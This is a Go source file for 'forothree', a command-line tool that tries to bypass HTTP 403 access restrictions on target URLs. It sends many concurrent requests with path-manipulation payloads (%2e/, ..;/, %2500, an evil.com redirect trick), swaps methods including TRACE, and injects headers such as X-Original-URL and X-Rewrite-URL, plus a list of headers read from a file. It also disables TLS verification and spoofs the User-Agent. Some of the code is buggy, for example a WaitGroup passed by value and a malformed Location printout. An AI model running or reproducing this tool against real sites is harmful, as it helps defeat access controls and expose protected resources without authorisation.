package main

import "fmt"
import "github.com/valyala/fasthttp"
import "time"
import "strconv"
import "os"
import "bufio"
import "net/url"
import "strings"
import "sync"
import "flag"
import "io/ioutil"
import "unicode"
import "regexp"
import "github.com/dchest/uniuri"
//import "net/http"
import "crypto/tls"


//forothree v.0.1
//created by hanhanhan


type rawconf struct {
	Url string
	Urlf string
	Bodylen bool
	Scode []string
	Outname string
	Outfile *(os.File)
	Timeout int
	Method string
	Headers []string
	Retnum int
	Headby bool
	Rec bool
	Xheaders bool
	Location bool
	Useragent string
}

func lastchartoasciicodeonly(s string) (int) {
	tem := []rune(s)
	temp := tem[len(s)-1]
	first := int(temp)
	return first
}

func firstchartoasciicode(s string) (string) {
	rest := fmt.Sprintf(s[1:])
	tem := []rune(s)
	temp := tem[0]
	temp2 := int(temp)
	first := strconv.Itoa(temp2)
	return fmt.Sprintf("%s%s%s","%",first,rest)
}

func Find(slice []string, val string) (int, bool) { //check if value exist in slice
    for i, item := range slice {
        if item == val {
            return i, true
        }
    }
    return -1, false
}

func headtorequest(r rawconf,dir string, h string,wg sync.WaitGroup) {
	headers := r.Headers
	headers = append(headers,h)
	myrequest(r,dir,"","",&wg)
}

func storehere(d string, f *(os.File) ) { //store result (in string) to file
	if _, err := f.WriteString(d); err != nil {
		fmt.Printf("[-] storing function error :  ")
		panic(err)
	}
	
}

func strtoreversecase(s string) (string) { //change an alphabet to upper (if lower), or to lower (if upper), return none if no alphabet found
	if s == "" {
		return ""
	}
	slic := strings.Split(s,"") //every char = an array index
	
	for i := 0; i < len(slic)-1; i++ {        		
		//slic := strings.Split(s,"")
		run := []rune(slic[i])
	

		if unicode.IsUpper(run[0]) {
			
			str := string(run[0])
			str = strings.ToLower(str)
			slic[i] = str
			res := strings.Join(slic,"")
			
			return res
		} else if unicode.IsLower(run[0]) {
			
			str := string(run[0])
			str = strings.ToUpper(str)
			slic[i] = str
			res := strings.Join(slic,"")
			
			return res
		} else {
			continue	
		}


	}
	return ""
}


func strtoaciicode(s string, n int) (string) { //change a char number n in string to ascicode
	slic := strings.Split(s,"") //every char = an array index
	run := []rune(slic[n])
	int := fmt.Sprintf("%%"+"%d",run) 
	slic[n] = string(int)
	res := strings.Join(slic,"")
	res = strings.Replace(res,"]","",1)
	res = strings.Replace(res,"[","",1)
	return res
}


func parseHeaders (v string) (string,string) { //parse header in stdin
	htemp := strings.SplitAfterN(v,":",2)
	//temp := htemp[0]
	htemp[0] = strings.Replace(htemp[0],":","",1)
	return htemp[0],htemp[1]
	//req.Header.Add(temp, htemp[1])
}

/*func parseurldir (urlz string) (string,string,error) { //parse url with single directory
	fmt.Println("domain3.4	:",  urlz)
	unparse,err := url.QueryUnescape(urlz)
	fmt.Println("domain3.5	:",  unparse)
	u,err := url.Parse(unparse)
	fmt.Println("domain4	:",  u)
	if err != nil {
		fmt.Println("[-] error, bad URL : %s",err)
	}

	var dir,domain = "",""
		
	if u.Scheme == "" { //parsing when no http schema
		u.Scheme = "https" 
		//fmt.Println("d1")
		//x := strings.SplitAfterN(urlz,"/",2)
		//fmt.Println("d2")
		//u.Host = x[0]
		//dir = x[1]
		
		domain = u.Scheme + "://" + u.Host
		
	} else { //parsing when there's http schema
		
		dir = strings.Replace(u.Path,"/","",1)	
		domain = u.Scheme + "://" + u.Host + "/"
	}


	//fmt.Println(domain)
	return domain,dir,nil
}*/

func parseurldirs (urlz string) (string,[]string,error) { //parse url with subdirectory
	unparse,err := url.QueryUnescape(urlz)
	u,err := url.Parse(unparse)
	
	if err != nil || u.Host == "" { // if got error/u.host none, possible ip addr

		u,err = url.Parse("//"+unparse) // //192.168.0.1 solve the parse() instead off 192.168.0.1 (without prefix double slash)
		if err != nil {
			fmt.Println("[-] error, bad URL :",err)
		}
	}
	
	var temp,domain = "",""
	
	//add http scheme if found none
	if u.Scheme == "" { //parsing when no http schema
		u.Scheme = "https" 
		domain = u.Scheme + "://" + u.Host + "/"
	
	} else { //parsing when there's http schema
		domain = u.Scheme + "://" + u.Host + "/"
		
	}
	temp = strings.Split(u.Path, "?")[0] //strip url parameters
	temp = strings.Split(temp, "%3F")[0] //strip url parameters when ? is encoded
	temp2 := strings.Replace(temp,"/","",1) // put /dodol/garut to dodol/garut for easier split
	dir := strings.Split(temp2,"/") //put every dir/subdir to arracy
	
	
	if dir[len(dir)-1] == "" {
		dir = dir[:len(dir)-1]	
	}
	
	
	return domain, dir,nil
}

func reqiterateheader(r rawconf,dir string,wg sync.WaitGroup,lol []string,i int) {

	    		headerstemp := r.Headers
	    		r.Headers = append(r.Headers,lol[i])
				myrequest(r,dir,"","",&wg)
				//if len(r.Headers) != 0 { //magic if to debug goroutine panic: runtime error: slice bounds out of range [:-1]
				//	r.Headers = r.Headers[:len(r.Headers)-1]		
				//}
				r.Headers = headerstemp 
}

func myrequest(r rawconf, dir string, before string, after string, wg *sync.WaitGroup) { //request engine

	//prepare url
	//fmt.Println("before process url : " + r.Url)
	url := ""
	if (before == "DOMAINMOD") { //url exception for bypass that modify domain
		r.Url = r.Url[:len(r.Url)-1]
		url = r.Url + after + "/" + dir
		
	} else if strings.HasPrefix(before, "DIRMOD") { //url exception for bypass that modify admin to %97dmin. coz special behavior in golang len() function
		url = r.Url+""+dir+after
	} else {
		url = r.Url+before+dir+after
	}
	//fmt.Println("after process url : " + r.Url)
	wg.Add(1)

	//prepare request
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer func() {
		fasthttp.ReleaseResponse(resp)
		fasthttp.ReleaseRequest(req)
	}()
	
	//generate http clint (just to get InsecureSkipVerify)
	//customTransport := http.DefaultTransport.(*http.Transport).Clone()
	//customTransport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := &fasthttp.Client{
    		//CheckRedirect: func(req *http.Request, via []*http.Request) error {
      		//	fmt.Println("LOL")
      		//	return http.ErrUseLastResponse
      		TLSConfig: &tls.Config{InsecureSkipVerify: true},
  	} 


	//set URL
	req.SetRequestURI(url)

	//add header
	if len(r.Headers) > 0 {
		for _,v := range r.Headers {
			i,j := parseHeaders(v)
			req.Header.Add(i, j)
		}
	}

	req.Header.Set("User-Agent", r.Useragent)	

	// define web client request Method
	req.Header.SetMethod(r.Method)
	
	//set request timeout
	var tout = time.Duration(r.Timeout) * time.Second
	
	//do request, break if not timeout, still 
	timeout := false
	for true {
		//fmt.Println(req.URI())
		var err = client.DoTimeout(req, resp, tout)
		

		//print error, code still redundant/inefficient
		if err != nil {
			
			r.Retnum--
			if err.Error() == "timeout" { 
				if r.Retnum == 0 {
			
					timeout = true //request is timeout
					break
				}
			} else {
				fmt.Println("[-] request error : ", err)
				break
			}
		} else {
			
			break
		}
	}

	//print output
	domaino := fmt.Sprintf("%s : %s ",r.Method,url)
	codeo := fmt.Sprintf("code : " + strconv.Itoa(resp.StatusCode()) + " |") //no filter status code yet
	re := regexp.MustCompile("[0-9]+")
	codeocheck := strings.Join(re.FindAllString(codeo,-1),"") //to get raw number of status code, used to determine whether to print it 
	

	lengtho := ""
	locationo := ""
	xheaderso := ""
	paddingo := 0
	
	if r.Bodylen {
		t := resp.String()
		lengtho = fmt.Sprintf("length : %v |",len(t)) //no filter length yet
	}
	
	if r.Xheaders {
		xheaderso = fmt.Sprintf("xtra-header : %v |",r.Headers[len(r.Headers)-1])
	}

	if r.Location {
		a := resp.Header
		b := string(a.Peek("Location"))
		if b != "" {
			locationo = fmt.Sprintf("location : %v |",)	
		}
	}
	
	_, found := Find(r.Scode,codeocheck) //statuscode filter
	
	

	//PADDING LOGIC
	//============================================================================================
	//add extra padding if domain is example.com.
	if before == "DOMAINMOD"  {
		paddingo = ((len(r.Url)+len(dir)+30) - (len(domaino)) + 1 )
	//add extra padding if firstchartoasciicode used
	} else if strings.HasPrefix(before, "DIRMOD") {
		if lastchartoasciicodeonly(before) < 100 {
			paddingo = (len(r.Url)+len(dir)+30) - (len(domaino)) - 2
			/*fmt.Println("LESS")
			fmt.Println(lastchartoasciicodeonly(before))
			fmt.Println(before)*/
		} else {
			paddingo = (len(r.Url)+len(dir)+30) - (len(domaino)) - 3
			/*fmt.Println("MORE")
			fmt.Println(lastchartoasciicodeonly(before))
			fmt.Println(before)*/
		}
	} else {
		paddingo = (len(r.Url)+len(dir)+30) - (len(domaino))
	}
	//add extra padding if domain is blank coz the dir is in x-rewrite
	if strings.HasPrefix(r.Headers[len(r.Headers)-1], "X-Rewrite-URL:/")  {
		paddingo = paddingo+len(r.Headers[len(r.Headers)-1]) - len("X-Rewrite-URL:/")
	}
	//============================================================================================
	
	if !(timeout) { //check if request timeout
		if found{
			fmt.Println(domaino + strings.Repeat(" ", paddingo)+ "|"  + codeo + lengtho + locationo + xheaderso)
		}
		if r.Outname != ""{
			if found{
				storehere(domaino + strings.Repeat(" ", paddingo)+ "|"   + codeo + lengtho + xheaderso + "\n",r.Outfile)	
			}
		}
	} else {
		fmt.Println(domaino + strings.Repeat(" ", paddingo)+ "|"  + "timeout")
	}
	wg.Done()
}


func payloads(r rawconf, dir string) { //standard bypass module
 	var wg sync.WaitGroup
	myrequest(r,dir,"","",&wg)
	defer func(){
		
		wg.Wait()
		
	}()
	
	
	//25 goroutine total

	//match, _ := regexp.MatchString("'\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}\b'", )
	go myrequest(r,dir,"","%2500",&wg)
	go myrequest(r,dir,"","%20",&wg)
	go myrequest(r,dir,"%2" + "e/","",&wg) 
	go myrequest(r,dir,"","%09",&wg)
	go myrequest(r,dir,"","/..;/",&wg)
	go myrequest(r,dir,"","..;/",&wg) 
	go myrequest(r,dir,".;/","",&wg)
	go myrequest(r,dir,"..;/","",&wg) 
	go myrequest(r,dir,"","/.",&wg)
	go myrequest(r,dir,"","//",&wg)
	go myrequest(r,dir,"./","/./",&wg)
	go myrequest(r,dir,"/","",&wg) 
	go myrequest(r,dir,"","//dir@evil.com",&wg)
	go myrequest(r,dir,"","//google.com",&wg)
	go myrequest(r,dir,"",".json",&wg)
	go myrequest(r,dir,"","?",&wg)
	go myrequest(r,dir,"\\..\\.\\","",&wg)
	go myrequest(r,dir,"","??",&wg)
	go myrequest(r,dir,"","#",&wg)
	go myrequest(r,dir,".;","",&wg)
	go myrequest(r,dir,"","/~",&wg)
	go myrequest(r,dir,"./","",&wg)
	
	_,_,err := parseurldirs(r.Url)
    if err == nil { //if err possible ip addr, domain bypass with . doesnt work and should fix dodol.com:443. to dodol.com.:443
    	go myrequest(r,dir,"DOMAINMOD",".",&wg)	
    }
	if dir != "" {
		go myrequest(r,firstchartoasciicode(dir),fmt.Sprintf("%s%s","DIRMOD",fmt.Sprintf(dir[:1])),"",&wg)	
	}
	if strtoreversecase(dir) != "" { 
		
		go myrequest(r,strtoreversecase(dir),"","",&wg) //not in goroutine fo a nasty way to keep goroutine run w/o encountering race condition									 
	}

	methodtemp := r.Method
	if r.Method == "GET" {
		r.Method = "POST"
		myrequest(r,dir,"","",&wg)	
		r.Method = "TRACE"
		myrequest(r,dir,"","",&wg)	
		r.Method = methodtemp
	} else if r.Method == "POST" {
		r.Method = "GET"
		myrequest(r,dir,"","",&wg)	
		r.Method = "TRACE"
		myrequest(r,dir,"","",&wg)	
		r.Method = methodtemp
	} else {
		r.Method = "POST"
		myrequest(r,dir,"","",&wg)	
		r.Method = "GET"
		myrequest(r,dir,"","",&wg)	
		r.Method = "TRACE"
		myrequest(r,dir,"","",&wg)	
		r.Method = methodtemp
	}
	

	
}

func payloads2(r rawconf, dir string) { //subdirectory bypass module
	//fmt.Println("p2")
	var wg sync.WaitGroup
 	
	myrequest(r,dir,"","",&wg)
	
	defer func(){
		
		wg.Wait()
		
	}()
	
	go myrequest(r,dir,"%2" + "e/","",&wg) 
	go myrequest(r,dir,"","..;/",&wg) // LOOP?
	go myrequest(r,dir,"..;/","",&wg) //and ../ LOOP? 
	go myrequest(r,dir,"/","",&wg) 
	go myrequest(r,dir,"","/~",&wg) 
	go myrequest(r,dir,"./","",&wg)
	if dir != "" {
		myrequest(r,firstchartoasciicode(dir),fmt.Sprintf("%s%s","DIRMOD",fmt.Sprintf(dir[:1])),"",&wg)	 //not in goroutine fo a nasty way to keep goroutine run w/o encountering race condition
	}
	_,_,err := parseurldirs(r.Url)
	if err == nil { //if err possible ip addr, domain bypass with . doesnt work and should fix dodol.com:443. to dodol.com.:443
    	myrequest(r,dir,"DOMAINMOD",".",&wg)	
    }
}



func payloads3(r rawconf, dir string) { //header bypass module
	
	r.Xheaders = true
	var wg sync.WaitGroup
 	
	defer func(){
		//wg.Done()
		wg.Wait()
		
	}()

	g,_ := os.Open("headerbypass.txt") // iterate file lineByLine                                                     
    g2 := bufio.NewScanner(g)
    
    
    var lol []string
    
    for g2.Scan() {  

    	var line = g2.Text()
    	lol = append(lol,line)
    	
    }

    
    for i := 0; i < len(lol); i++ {

	    	go reqiterateheader(r,dir,wg,lol,i)
    	
    }
    
    //go func() { //NOT CONCURRENT YET
		r.Headers = append(r.Headers,"X-Rewrite-URL:/"+dir)
		myrequest(r,"","","",&wg) //LOOP?
		if len(r.Headers) != 0 { //magic if to debug goroutine panic: runtime error: slice bounds out of range [:-1]
			r.Headers = r.Headers[:len(r.Headers)-1]	
		}
	//}()

	//go func() { //NOT CONCURRENT YET
		sabeb := uniuri.NewLen(len(dir)) //generate random string
		r.Headers = append(r.Headers,"X-Original-URL:/"+dir)	
		myrequest(r,sabeb,"","",&wg)
		if len(r.Headers) != 0 { //magic if to debug goroutine panic: runtime error: slice bounds out of range [:-1]
			r.Headers = r.Headers[:len(r.Headers)-1]
		}
	//}()

		uatemp := r.Useragent 
		r.Useragent = "okhttp/4.1.1"
		myrequest(r,dir,"","",&wg)
		if len(r.Headers) != 0 { //magic if to debug goroutine panic: runtime error: slice bounds out of range [:-1]
			r.Headers = r.Headers[:len(r.Headers)-1]
		}
		r.Useragent = uatemp

}

/*func payload3wrapper(b bool,r rawconf, dir string) { 
	if !(b){
		payloads3(r,dir)
	}
}*/


func main() {

    var r = rawconf{}

    flag.BoolVar(&(r.Bodylen),"l",false," show response length")
    
    //code still redundant/inefficient
    t1 := flag.String("s","200,404,403,301,404","-s specify status code, ex 200,404")
    
    
    //code still redundant/inefficient
    t2 := flag.String("e","Connection:close"," set custom headers, ex head1:myhead,head2:yourhead")
    
    
    flag.IntVar(&(r.Timeout),"t",3," specify request timeout in seconds")
    flag.StringVar(&(r.Method),"m","GET"," set request method")
    flag.IntVar(&(r.Retnum),"r",2," set max number of retries")
    flag.StringVar(&(r.Url),"u",""," url target")
    flag.StringVar(&(r.Urlf),"ul",""," url list target")
    flag.StringVar(&(r.Outname),"o",""," specify output file name")
    flag.StringVar(&(r.Useragent),"ua","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"," specify User-Agent")
    flag.BoolVar(&(r.Headby),"b",false," disable header bypass")
    flag.BoolVar(&(r.Location),"hl",false," show header location")
    flag.BoolVar(&(r.Rec),"c",false," disable recursive bypass")
    r.Xheaders = false
    flag.Parse()
    
    
    r.Scode = strings.Split(*t1,",")
    r.Headers = strings.Split(*t2,",")

    //create file if -o enabled
    if r.Outname != "" {
	    f,err := os.OpenFile(r.Outname,os.O_APPEND|os.O_WRONLY|os.O_CREATE,0644)
	    if err != nil {
	    	fmt.Printf("[-] create file error : ")
	    	panic(err)
	    	}
	    r.Outfile = f

    }
    
    
    var g *os.File
    var g2 *bufio.Scanner
    tfile := "/tmp/l8nwe9vnjeiohfn9fnme"  //file for temp

    //close file if -o enabled
    defer func() {
    	if r.Outname != "" {
    		r.Outfile.Close()
    		os.Remove(tfile)
    	}
    }()

    //-u and -ul logic
    if r.Url != "" && r.Urlf != "" {
		fmt.Println("[-] use either -u or -ul")
		os.Exit(3)
    } else if r.Urlf != "" {
    	g,_ = os.Open(r.Urlf) // iterate file lineByLine                                                     
	    g2 = bufio.NewScanner(g)                                                                                    
	    
    } else if r.Url != "" {
    	d1 := []byte(r.Url)
	    
	    err := ioutil.WriteFile(tfile, d1, 0644) //need to change to random name
	    if err != nil {
			fmt.Println("[-] cannot create temp file")
			panic(err)
		}
	    
	    g,err = os.Open(tfile) // iterate file lineByLine                                                     
	    if err != nil {
			fmt.Println("[-] cannot open temp file")
			panic(err)
		}

	    g2 = bufio.NewScanner(g)                                                                                    
    } else {
    	fmt.Println("[-] No target found")
    	os.Exit(3)
    }

    //url(s) to iteration
    for g2.Scan() {                                                                                              
        var line = g2.Text()	
        


        domain,dirs,_ := parseurldirs(line)
        
        //if based on number of directory
        if len(dirs) > 1 {
        	
        	last := dirs[len(dirs)-1]
        	//last2 := last
        	dirstemp := dirs[0:len(dirs)-1]
        	middle := strings.Join(dirstemp, "/")
        	
        	r.Url = domain  + middle + "/"
        	
        	
        	
        	if !(r.Rec) {	        	
	        	for i := 0; i < len(dirs); i++ {   // len(dirs)-1 for keeptesting all level of directory excluding file destination      		
	        		
	        		middle = strings.Join(dirs[0:i], "/")
	        		last = strings.Join(dirs[i:len(dirs)], "/") //?
	        		if middle == "" { //for debug when https://dodol.com//dir/subdir happen
	        			r.Url = domain  + middle
	        			
	        		} else {
	        			r.Url = domain  + middle + "/"	
	        		}
	        		
	        		payloads2(r,last)
	        	}
        	}
        	//fmt.Println(dirs)
        	last2 := strings.Join(dirs, "/")
        	
        	payloads(r,last2)//-------|
      		if !(r.Headby) {//        |-----need to go concurrent
      			payloads3(r,last2)//--|
      		}
      		
      		

        } else {
        	r.Url = domain
        	dir := dirs[0]
        	
        	
        	if !(r.Headby) {
        		payloads(r,dir)	//---|
        		payloads3(r,dir)//---|--------need to go concurrent
        	} else {
        		payloads(r,dir)
        	}
        	
        }
        

                         
	}



	
}
